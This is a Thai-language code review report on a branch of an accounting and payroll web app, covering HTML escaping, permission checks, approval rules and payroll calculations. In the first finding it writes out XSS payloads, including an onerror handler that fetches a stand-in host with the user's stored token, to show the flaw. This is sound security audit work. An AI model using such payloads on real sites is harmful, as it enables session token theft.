# รอบ 200 · ฝ่ายค้าน ทีม R (อ่านอย่างเดียว)

> ขอบเขต: `git diff 5c1fe028 worktree-agent-a2d1e4bf684430df2` (โค้ดที่ `65efdd86`) · 37 ข้อของทีม R · อ่านไฟล์จาก branch ด้วย `git show` เท่านั้น ·
> ไม่ได้คอมไพล์ (ไม่มี .NET SDK) · checker ที่รันบนสำเนา `git archive` = ดูท้ายไฟล์
> สามคำถามของ F3 ข้อ 11 ต่อข้อ: ทิศตรงข้าม (ใบที่ถูกยังถูก) · ทางเข้าอื่น · ลายเซ็นที่เปลี่ยน/คอมไพล์

## สรุป

| ระดับ | CONFIRMED | PLAUSIBLE |
|---|---|---|
| P1 | 1 (R200-X1 — G2-02 ยังไม่ปิด: หัวเอกสาร + CSS ของเทมเพลต + endpoint เทมเพลตไม่มีด่านสิทธิ์) | — |
| P2 | 2 (R200-X2 H-3 ไม่มีผลจริงตอนปิด AI · R200-X3 แก้กฎอนุมัติแล้วล้าง Description/ProjectId เงียบ) | — |
| P3 | 1 (R200-X4 P4-1 ครอบแค่ Draft) | 4 (X5 seed-defaults ของคนที่ไม่ใช่เจ้าของ = ถูกเตะออกจากระบบ · X6 รายงาน ปกส. ใช้ตัวตัดสินเลข ปกส. คนละตัวกับไฟล์ · X7 D-08 ไม่ใช่ "จุดสุดท้าย" · X8 H-3 คำตอบครูนอกชุดถูกทิ้ง = ยิงซ้ำ) |

ข้ออื่นทุกข้อ (G2-11 · B-06 · B-07 · B-09 · B-10 · B-05(a) · F-05 · F-06 · G2-05 · G2-06 · G2-08 (ด่าน) · G2-09 · A07 (ส่วนสัญญา) · A11/E-05/A19/E-12 · A12/E-04 · E-03 · E-08 ·
E-02(ข้อความ) · D-03 · D-04 · D-05 · D-06 · D-09 · D-10 · D-11 · C-04 · P4-2 · P4-7) = **NOT-A-BUG** ตามหลักฐานใน §3
ความเสี่ยงคอมไพล์ 4 เรื่องที่ถูกขอให้ตรวจ = ไม่พบปัญหา (§4)

---

## 1. CONFIRMED

### R200-X1 · P1 · G2-02 ยังไม่ปิด — ช่องที่ผู้แก้เทมเพลต/ค่าตั้งคุมได้ยังเข้า HTML ดิบ และใครก็แก้เทมเพลตได้
- `PdfGenerationService.cs:1991` `sb.AppendLine($"<div class='doc-title'>{title}</div>")` — `title` มาจาก `ComputeDocumentTitle` (`:1405-1420`) ซึ่งคืน
  `template.CustomTitle` / `CustomTitleEn` หรือค่าจาก `CompanySettings.DocumentTitleOverridesJson` (`ParseTitleOverrides` `:1203`) **ดิบ** — ไม่ถูกหนี
- `BuildCss` `:2952` `font-family: '{t.FontFamily}'` · `color: {t.PrimaryColor}` · `:2959` `background:{t.HeaderBackgroundColor}` · `.doc-title … {t.TitleFontSize}` ·
  `{t.AccentColor}` · `:3009` `{t.TableHeaderColor}` — ทั้งหมดต่อเข้า `<style>` ดิบ (`DocumentTemplateService.UpdateAsync:371-374` รับค่าตามที่ส่งมา ไม่มี regex/hex)
  ⇒ ค่า `x'</style><img src=x onerror=…>` ปิด `<style>` แล้วยิงสคริปต์ได้ (tokenizer ของ HTML จบ `<style>` ที่ `</style>` เสมอ)
- `DocumentTemplateController.cs:27-84` — Create/Update/Delete/SetDefault/Duplicate มีแค่ `[Authorize]` (ไม่มี `[RequirePermission]`) และ service ไม่มีด่านสิทธิ์
  ⇒ **สมาชิกระดับใดก็ได้** (รวมผู้ดูอย่างเดียว) แก้เทมเพลต default ของบริษัท ใส่ `CustomTitle = "<img src=x onerror=fetch('//x/'+localStorage.token)>"`
  ⇒ เจ้าของเปิดพรีวิวเอกสารใดก็ได้ (`documents.html` ใส่ HTML ลง `innerHTML` — ตามคำอธิบายของทีมเอง) ⇒ ขโมย JWT = ฉากเดียวกับ G2-02 ที่ทีมปิดเป็น P0
- ทีมหนี **ลายน้ำ** (G2-11 · ผู้กระทำคนเดียวกัน = ผู้แก้เทมเพลต) แต่ไม่หนีหัวเอกสาร/CSS ในไฟล์เดียวกัน ⇒ "หนีทุกช่องที่ผู้ใช้คุมได้" (team-R §1) ไม่จริง
- ทางแก้ที่สั้นที่สุด: `WebUtility.HtmlEncode(title)` ที่ `:1991` (ต้องไม่หนี `CornerBadge(L.CopyOriginal)` ซ้ำ) + `SanitizeHex` กับสีทุกช่องใน `BuildCss` (มีตัวนี้อยู่แล้ว `:1880/3083`) +
  whitelist ฟอนต์/ขนาด + `[RequirePermission]` บนเส้นเขียนของ `DocumentTemplateController` (G2-10 checker ครอบ 8/143 — ตัวนี้ไม่อยู่ในนั้น)
- ทิศตรงข้าม: หัวเอกสารภาษาไทยปกติ ("ใบกำกับภาษี/ใบเสร็จรับเงิน") ไม่มีอักขระพิเศษ ⇒ encode แล้วหน้าตาเท่าเดิม · QuestPDF ไม่กระทบ (ไม่ใช่ HTML)

### R200-X2 · P2 · H-3 — "บันทึกเมื่อครูหรือนักเรียนตอบ" ไม่เคยเกิดขึ้นจริงตอนปิด AI
- `AiSuggestionController.cs:2983` `AnomalyExplainVerdict.ShouldPersist(resp.UsedAi, resp.FromLocalModel, resp.PrimaryAnswer)` ต้องการ `PrimaryAnswer ∈ {LikelyError, LikelyLegit, NeedReview}`
- แต่นักเรียน `AnomalyExplanationDistillationModel`:
  (ก) `ExtractInput` `:122` อ่าน `root.amount`/`root.history` ขณะที่ `AnomalyExplainPrompt.Build` (`BankAndAnalyticsPrompts.cs:~190`) ส่ง `{task, anomaly:{amount,…}, vendor_history_12mo, recent_12mo}` ⇒ คืน `null` ทุกครั้ง = นักเรียนไม่เคยตอบ
  (ข) ต่อให้ตอบ `PrimaryAnswer` = JSON `{"isAnomaly":…,"severity":…}` (`:67-74`) ⇒ `Normalize` = null ⇒ `ShouldPersist` = false
- เส้นปิด provider จริง = `AiOrchestrator.FallbackToLocal` (`:593-608`) คืน `LocalPrimaryAnswer` = `localGuess` ของ controller (`"LikelyError"/"NeedReview"` `:2973`) กับ `FromLocalModel=false` ⇒ ไม่บันทึก
- ผล: kill-switch (กฎเหล็ก #1 ข้อ 5) ยังเหมือนก่อนแก้ทุกประการ — คอลัมน์ AI ว่าง · เปิดหน้าใหม่ = เรียกซ้ำ · `AnomalyExplainVerdictTests` เขียวเพราะทดสอบแค่ helper (F2 #2 "เทสต์ที่เรียกแค่ helper ≠ ด่านถูกต่อสาย")
- ส่วนที่ถูก: ป้าย `usedAi` ของคำตอบแคช (`:2918` ดู `AiPrimaryAnswer != null` — orchestrator เขียน `AiPrimaryAnswer: null` ทุกเส้นที่ไม่ใช่ครู `:369/391/403/431/541`) = ซื่อสัตย์แล้ว
- ทางแก้: ให้นักเรียนอ่าน `anomaly.amount` + `recent_12mo`/`vendor_history_12mo` และคืน `primary` ในชุด (map `isAnomaly`/severity → LikelyError/NeedReview/LikelyLegit) หรือ
  ยอมรับว่า feature นี้ไม่มี student (แก้ DOCUMENT_FLOW ตาราง distillation) — เลือกอย่างตั้งใจ

### R200-X3 · P2 · A07 — แก้กฎอนุมัติจากหน้าใหม่ล้าง Description และ ProjectId เงียบ ๆ
- `approval.html:397` payload ส่ง `description: null` และไม่มี `projectId` · `ApprovalService.UpdateRuleAsync:124-129` เขียนทับ `rule.Description = request.Description` · `rule.ProjectId = request.ProjectId` (ไม่ใช่ "null = ไม่แตะ")
- `ApprovalRuleResponse` echo ทั้ง `Description` และ `ProjectId` กลับมา แต่ `editRule` ไม่ hydrate/ไม่ส่งกลับ ⇒ กฎที่จำกัดโครงการ (สร้างผ่าน API/ก่อนหน้า) กลายเป็น "ทุกโครงการ" ทันทีที่เปิดแก้แล้วกดบันทึก
  = defect class "เก็บแล้วต้อง echo กลับ" (กฎเหล็ก #4 A ข้อ 2) — ผลคือเอกสารของโครงการอื่นถูกดึงเข้ากฎอนุมัติที่ไม่ได้ตั้งใจ
- ทางแก้: payload ส่ง `description: r.description ?? null` และ `projectId: r.projectId ?? null` จากแถวเดิม (หรือให้ Update ถือ null = ไม่แตะ) — `sme-config.html:268` สร้างอย่างเดียว ไม่กระทบ

### R200-X4 · P3 · P4-1 — ล้าง PaymentDate เฉพาะใบ Draft แต่ resume อนุมัติใบ WaitingApproval/Rejected ด้วย
- `DocumentService.cs:4217` `draft.Status == DocumentStatus.Draft` · แต่ `DepositKindDocumentRules.ResumeForfeitInvoice` (`:163,171,177`) คืน `ApproveThenApply` สำหรับทุกสถานะที่ `!IsIssued` (รวม WaitingApproval/Rejected)
  ⇒ ใบร่างรุ่นก่อน R3-1 ที่ถูกส่งรออนุมัติไว้ ยังอนุมัติด้วย PaymentDate เดิม = tax point ย้อนเดือนรับเงิน (ปัญหาเดิมของ P4-1) · ใช้ `!DocumentStatusRules.IsIssued(draft.Status)` แทน

## 2. PLAUSIBLE

- **R200-X5 · P3 · G2-08** — `EnsureOwnerAccessAsync` โยน `UnauthorizedAccessException` ⇒ `ExceptionMiddleware.cs:43` = **401** ⇒ `api.js:399-405` ลบ token แล้วเด้งไป login.
  `roles.html:238-239` โชว์ปุ่ม "สร้าง Role เริ่มต้น" ให้ทุกคนที่เปิดหน้าได้เมื่อยังไม่มี Role ⇒ สมาชิกที่ไม่ใช่เจ้าของกด = ถูกออกจากระบบแทนข้อความไทย (เดิมกดสำเร็จ).
  พฤติกรรมเดียวกับ endpoint Role อื่นอยู่แล้ว (ไม่ใช่ของใหม่ทั้งหมด) แต่รอบนี้เพิ่มทางเข้าใหม่ · ทางแก้ = ซ่อนปุ่มตาม `my-permissions.isOwner` หรือโยน 403 · ทางเข้าอื่นที่ seed Role: ไม่มี (callers = controller 1 จุด — ไม่พังตอนสร้างบริษัท/onboarding)
- **R200-X6 · P3 · G2-05 × D-06** — `PayrollService.GenerateSsoReportAsync:4225` แสดง `Employee.SocialSecurityNumber` (ว่างเกือบทุกคนตาม D-06) ⇒ รายงานบนจอขึ้น "-" ขณะที่ไฟล์ สปส.1-10 ใช้เลขบัตรผ่าน
  `SsoInsuredNumber.Resolve` — ตัวตัดสิน "เลข ปกส. ของคนนี้คืออะไร" สองชุด (F2 #4) · ควรเรียก `Resolve` ก่อน mask
- **R200-X7 · P3 · D-08** — ทีมเขียนว่าเป็น "จุดสุดท้ายที่ยังเป็น banker's" แต่ยังมี `Math.Round` ไม่ระบุ midpoint ใน `PayrollService.cs:1215` (expectedNet) · `:2911` `:2940` (อัตราภาษีบน 50 ทวิ) ·
  `SsoRateSchedule.GetMaxContribution` — ยอดส่วนใหญ่เป็นอัตรา/ค่าตรวจ ไม่กระทบเงินที่จ่าย แต่ข้อความใน team-R ไม่ตรง
- **R200-X8 · P3 · H-3 ทิศตรงข้าม** — คำตอบครูที่ไม่อยู่ในชุด (เช่น `"likely_error"`, คำไทย) เดิมถูกเก็บดิบ · ตอนนี้ถูกทิ้ง ⇒ จ่าย token แล้วไม่เก็บ + เปิดหน้าใหม่ = เรียกครูซ้ำทุกครั้ง
  (ถูกต้องในแง่ write-gate แต่ควรเก็บ `AiReasoning` ไว้เป็นแคชแม้ `AiVerdict` = null เพื่อกันยิงซ้ำ)

## 3. NOT-A-BUG (ตรวจแล้ว · หลักฐาน)

| ID | ตรวจอะไร | ผล |
|---|---|---|
| G2-02 (ส่วน src) | `HtmlImageSource` รับ `data:image/*;base64` · https/http · `/path` | `TryLogoDataUri` คืน `data:{png/jpeg/gif/webp/svg+xml};base64,` ผ่าน regex · ลายเซ็นทุกเส้นเติม `data:image/png;base64,` (`:971-1153`) · โลโก้/ตราอัปโหลดคืน `{webBaseUrl}/{name}` (ขึ้นต้น `/`) ⇒ รูปที่เคยพิมพ์ได้ยังพิมพ์ได้ · URL มี `&` ถูก encode แล้ว browser decode กลับ · ข้อเสียเดียว: path สัมพัทธ์ไม่ขึ้นต้น `/` ถูกทิ้ง (team-R §7.3 ตัดสินแล้ว) |
| G2-02 (ช่องอื่น) | เลขเอกสาร/อ้างอิง/TaxId/หัวกล่อง/ใบเสร็จ | หนีครบ · ไล่ทุก `$"…{x}…"` ใน `:1850-2460` ที่เหลือ = ป้ายจาก `DocumentLabels`/ตัวเลข/ข้อความคงที่ ยกเว้น X1 |
| G2-11 | ลายน้ำ/ข้อมูลการชำระเงิน | QuestPDF (`DocumentRenderer.cs:1041-1047`, `:170`) พิมพ์ข้อความดิบอยู่แล้ว ⇒ หลังแก้ HTML ตรงกับ QuestPDF **มากขึ้น** (ไม่ drift) |
| B-06 | `DocumentRetention.EffectiveUntil` | ใบออกแล้ว (รวม Voided) ไม่มีค่า ⇒ คำนวณ · Draft/Waiting/Rejected/`DRAFT-` ⇒ ลบได้เหมือนเดิม · ผู้เรียก `PurgeDocumentAsync` = `DocumentController:988` จุดเดียว · ลบใบอื่นในเรพ = `Documents.Remove` เฉพาะ Draft (`:8794`) · สูตร Approve ใช้ตัวเดียวกัน |
| B-07 | `SourceIsPurchaseSide(rt) \|\| GRN` | `relType is DocumentType rt` ถูกชนิด · ชุดเดิม PI/Expense/GRN ยังอยู่ + PV/CIL ⇒ ทิศตรงข้ามไม่แคบลง |
| B-09 | warn-gate เดือนภาษียื่นแล้ว | precedence `a != 0 && x is A or B && !(…)` ถูก · ข้ามมัดจำ VAT พัก · ข้ามฝั่งซื้อผ่าน `ResolveSide` · คำเตือนเฉพาะใบลงวันที่ย้อนเข้าเดือนที่ยื่นแล้ว (ใบปกติลงเดือนปัจจุบัน ⇒ ไม่ฟ้องทุกใบ) · false positive เล็ก: ใบแจ้งหนี้บริการ VAT ยังไม่ถึงกำหนด — P3 ไม่นับ |
| B-10 | รอบบัญชี §65 ตรี(4)/(10) | `FiscalYear.RangeFor(...).Start/EndExclusive` มีจริง · Kind ของ DateTime เหมือนสูตรเดิม · `TaxService:2147` (ภ.ง.ด.50) แยกอยู่แล้ว |
| B-05(a) | กล่องเหลือง | `ToJson` เก็บเฉพาะ finding จริง (`Findings.Count>0`) ⇒ ไม่ขึ้นทุกใบ · ชื่อคีย์ `RuleCode/LegalReference/Message` ตรงกับที่ JS อ่าน · escape ครบ |
| F-05 | projection สาธารณะ | คัดลอกทุก property ของ `LodgingRoomTypeDto` ยกเว้น `Units`/`ProductId` · storefront ไม่อ่าน `units` · `GetRoomTypesAsync` อีกผู้เรียก = `LodgingController:87` (ล็อกอิน) |
| F-06 | `_splitGuests` | ผลรวม = จำนวนจริง (ผู้ใหญ่ขั้นต่ำ 1/ห้องเหมือนเดิม) · ความจุต่างชนิดห้องยังแบ่งเท่ากันเหมือนเดิม — ไม่ถดถอย |
| G2-05 | `includePii` | ผู้เรียกทั้งเรพ = `PayrollController:680/692` เท่านั้น (ไม่มี job/เทสต์) · `CanViewPiiAsync` บันทึก PiiAccessLog เฉพาะผู้เห็นเต็ม · หน้าเว็บใช้แค่แสดงผล (`payroll.html:2237/2250`) ไฟล์ยื่นแบบไม่ผ่านเมธอดนี้ |
| G2-06 | ถอดรหัสแล้วเทียบ | projection ผ่าน value converter ⇒ ได้ค่าถอดแล้ว · ไม่มี query `CitizenId ==` เหลือในเรพ · แคช scoped ต่อคำขอ (ไม่ใช่ static — D ผ่าน) |
| G2-08 | seed ต้องเป็นเจ้าของ | ผู้เรียก 1 จุด (controller ส่ง `userId`) · ไม่มีเส้น onboarding/สร้างบริษัทเรียก ⇒ ไม่พัง · idempotent ตามชื่อ (เจ้าของเปลี่ยนชื่อ Role เริ่มต้นแล้วกดซ้ำ = ได้ชื่อเดิมคืน — ยอมรับได้) |
| G2-09 | สมาชิกบริษัท | `CompanyUsers` ลบจริงตอนถอดสมาชิก (`CompanyService:549`) ⇒ membership = ปัจจุบัน · `sme-config.html` ผ่านด่านเดียวกัน (ชื่อว่างตอนนี้ได้ข้อความไทยแทนบันทึกได้ — ทิศที่มองเห็น) · Update ใช้ `CreateApprovalRuleRequest` ⇒ `ValidateRuleAsync` ชนิดตรง |
| A07 (สัญญา) | payload ↔ DTO | `name/documentType/min/max/steps[{stepOrder,approverUserId,isRequired}]` ตรง · `getMembers` คืน `userId/fullName/email` (`CompanyMemberResponse`) · suggest คืน `approverUserId` (`AiSuggestionController:~2473`) · `docTypeLabel` เปลี่ยนเป็น `this._DOC_TYPE_LABELS` — ทุกผู้เรียกเป็น `Layout.docTypeLabel(…)` (ไม่มีการส่ง method เป็น callback) ⇒ `this` ไม่หลุด |
| A11/E-05/A19/E-12 | ช่องว่าง | `??` ไม่กลืน 0 ที่พิมพ์เอง (VAT 0 คงเป็น 0) · ข้อสังเกต P3: ตอน**แก้**สินค้า ล้างช่องราคาแล้ว = 0 (เดิมคงค่าเดิม) — ทีมถามเจ้าของไว้แล้ว §7.1 |
| A12/E-04 | แก้อายุ/ซาก/วิธี | ตรวจ posted เฉพาะเมื่อค่าเปลี่ยน · hydrate `fLife/fSalvage/fMethod` ตรงค่าที่เก็บ (มี option `None`/`DoubleDecliningBalance`) ⇒ แก้ชื่อ/ที่ตั้งของสินทรัพย์ที่คิดค่าเสื่อมแล้วไม่ถูกปฏิเสธ · สร้างตารางใหม่เฉพาะเมื่อไม่มีงวดลงบัญชี |
| E-03 | นำเข้า | แถวนำเข้าไม่มีผังบัญชี ⇒ หมวด (Category) เป็นสัญญาณเดียวที่มี · ข้อความไม่รู้จัก = ปฏิเสธแถว (ทิศที่มองเห็น) · ว่าง = เส้นตรงเหมือนเดิม |
| E-08 | ledger ตัวเดียว | `StockLedger.MoveAsync:164-173` ตรวจ `NegativeStockGuard` ทุกกรณี (ไม่ขึ้นกับ `UnitCostOverride` — ผู้ใช้ส่ง `unitCost` มาก็ข้ามไม่ได้) · `AllowNegativeOverride: true` มีจุดเดียว = กลับรายการ (`DocumentService:14265`) · ทิศตรงข้าม: สินค้า `TrackStock=false` ปรับติดลบได้แล้ว (เดิมด่านตัวที่สองบล็อก) — ถูกตามนิยาม |
| D-03 | `tax/sso-rate` | `SsoRateSchedule.GetDefault` คืน `Rate` เป็นเศษส่วน (0.05) ⇒ `×100` = 5 ถูก · ปี 2026 = 17,500 ตรงกับเครื่องคำนวณ |
| D-04 | กำหนดส่ง/เงินเพิ่ม | สูตรย้ายมาตรงตัว (เทสต์เทียบทุกวันทั้งปี) · `PayrollRun.Month` ถูกตรวจ 1–12 ทั้งสองเส้นสร้าง (`:1076/:1148`) ⇒ `SsoDueDate` ไม่โยนในลิสต์ · ค่าเริ่มต้นวันที่จ่ายเปลี่ยนจาก "วันครบกำหนด (ย้อน)" เป็น "วันนี้" = ถูกกว่า |
| D-05 | ทิป | Σ ส่วนแบ่ง = กอง (largest remainder) · `ShouldWithhold` = `>= 1000` เท่าเดิม · อัตรา 3% จากตาราง · ไม่มีผัง 21915 = ล้มดังก่อนธุรกรรม (เดิม JE ไม่สมดุลอยู่แล้ว) |
| D-06 | ไฟล์ .txt | เลข ปกส. ที่กรอกไว้ชนะเสมอ · ใช้เลขบัตรเฉพาะที่ checksum ผ่าน · ไม่แต่งเลข |
| D-09 | ฐานภาษีสะสม | `TaxableGross > 0 ? … : Gross` สูตรเดียวกับ `:3414/:4165` ที่มีอยู่ · ขอบ: งวดที่ทั้งก้อนยกเว้นภาษี (TaxableGross=0) ย้อนใช้ gross = พฤติกรรมเดิม ไม่แย่ลง |
| D-10 | PVD | ผู้คำนวณ PVD มีจุดเดียว (`:2097-2098`) · ไม่มีเส้นอื่นคิด PVD จาก `BaseSalary` |
| D-11 | 50 ทวิ audit | `AddChainedAuditLog` นับแถว pending ในลูปเดียวกัน (`AccountingDbContext:3614-3620`) ⇒ ไม่แตกกิ่ง · เลขบัตร mask |
| C-04 | acceptedAi ของ API | ตัวเทียบเดียวกับเส้นเว็บ (`OcrService:5078/6809`) · กรอง tenant ก่อน |
| P4-2 | ข้อความหลังอนุมัติล้ม | อ่านสถานะจริงแบบ AsNoTracking หลัง reload |
| P4-7 | ด่านชั้นความลับ | `SensitivityAccess.NeedsCheck/DeniedMessage` · `ISensitivityService.CanViewAsync(Guid,Guid,SensitivityKind)` · `Document.Sensitivity` ชนิด `SensitivityKind` — ลายเซ็นตรงทั้งหมด |

## 4. ความเสี่ยงคอมไพล์ที่ถูกขอให้ตรวจ

1. **`UpdateFixedAssetRequest(... DepreciationMethod? DepreciationMethod = null)`** — ไม่มีการอ้าง `DepreciationMethod.X` ภายใน record (ค่า default = `null`) · ตำแหน่งชนิดของพารามิเตอร์เป็น type context
   (lookup เห็นเฉพาะชนิด) ⇒ คอมไพล์ผ่าน · หมายเหตุ: กฎ "Color Color" **ไม่ครอบ** กรณีนี้ (ชนิดของ property คือ `Nullable<DepreciationMethod>` ไม่ใช่ `DepreciationMethod`) — ถ้าวันหน้ามีใครเขียน
   `= DepreciationMethod.StraightLine` เป็น default ของพารามิเตอร์ตัวอื่นใน record นี้ จะผูกกับ property แล้ว CS0120/CS1061 · ใน `FixedAssetService` ไม่มีสมาชิกชื่อนี้ ⇒ `DepreciationMethod.None` = enum ถูก
2. **`[InlineData(60, -1)] … (int life, decimal salvage)`** — มี precedent ที่ผ่าน CI แล้ว (`ThaiPitCalculatorTests.cs:60-66` int → decimal ทั้งคู่) · xunit 2.9.2 แปลงให้
3. **`return block;`** ใน `SsoLateFeePreview` — `CheckPayrollAccessAsync` คืน `Task<ActionResult?>` (`PayrollController:89`) · `ActionResult → ActionResult<T>` มี implicit operator ⇒ ผ่าน (รูปเดียวกับ endpoint อื่นในไฟล์)
4. ลายเซ็นที่เปลี่ยน: `GeneratePnd1Async/GenerateSsoReportAsync(+includePii)` ผู้เรียก 2 จุด (controller) · `SeedDefaultRolesAsync(+actorUserId)` 1 จุด · ไม่มีเทสต์/job/mock ของ interface เหล่านี้ใน `Accounting.Tests` ⇒ ครบ ·
   `ToDictionaryAsync(key, element, ct)` มี overload ใน EF Core · `SsoLateFee.Result` (nested sealed record ใน static class) ใช้ใน `ApiResponse<…>` ได้ ·
   `TipShareAllocation.Split(totalTip, staffSharePercent.ToList())` — `List<KeyValuePair<Guid,decimal>>` เป็น `IReadOnlyList<…>` · deconstruct `(staffId, grossTip)` จาก tuple ชื่อ ⇒ ผ่าน

## 5. checker ที่รันบนสำเนา branch (`git archive` → scratchpad)
- `required_call_site_check.py` = **399 กติกาผ่าน** (+ negative test ในตัว 14 เคส) · `html_attr_escape_check.py` = 0 จุด (ตัวนี้ดูเฉพาะ `.html` — จึงไม่เห็น X1 ที่อยู่ใน renderer C#)
- `dead_helper_check.py` ฟ้อง `SettlementPostingChecks.PendingElsewhere/StanceOf` — ไฟล์นี้ **ไม่อยู่บน branch ทีม R** (`git cat-file -e` = ไม่มี) แต่โผล่ในสำเนาเพราะ scratchpad ถูก session อื่นเขียนร่วม ⇒ ไม่นับเป็นของทีม R ·
  ผลทั้งสามตัวจึงเป็น "indicative" — ควรรัน `bash tools/check_all.sh` บน worktree ของทีม R อีกครั้งก่อน merge
